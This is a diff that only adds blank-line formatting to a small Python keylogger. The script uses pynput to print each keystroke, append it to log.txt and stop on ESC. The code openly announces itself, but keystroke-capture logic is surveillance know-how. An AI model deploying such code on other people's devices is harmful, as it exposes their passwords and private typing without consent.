@@ -6,9 +6,11 @@ from pynput.keyboard import Listener
 
 LOGFILE = "log.txt"
 
+
 def write_log(line: str):
     with open(LOGFILE, "a", encoding="utf-8") as f:
         f.write(line + "\n")
+
 
 def on_press(key):
     try:
@@ -18,6 +20,7 @@ def on_press(key):
 
     print(line)
     write_log(line)
+
 
 def on_release(key):
     try:
@@ -31,6 +34,7 @@ def on_release(key):
     if key == key.esc:
         print("ESC pressed — exiting.")
         return False  # Stop the listener
+
 
 if __name__ == '__main__':
     print("Keylogger started. Press ESC to quit.")
